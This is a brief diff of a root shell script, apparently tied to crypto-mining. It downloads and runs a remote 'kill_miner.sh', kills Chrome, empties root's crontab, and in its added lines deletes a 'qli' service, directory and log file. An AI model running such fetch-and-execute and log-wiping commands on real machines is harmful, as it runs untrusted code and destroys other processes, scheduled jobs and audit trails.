@@ -3,6 +3,10 @@ wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_
 chmod +x /root/kill_miner.sh
 ./kill_miner.sh
 sleep 3
+rm /etc/systemd/system/qli.service
+systemctl daemon-reload
+rm -R /q
+rm /var/log/qli.log
 /bin/pkill -f "chrome"
 cat /dev/null > /var/spool/cron/crontabs/root
 sleep 3
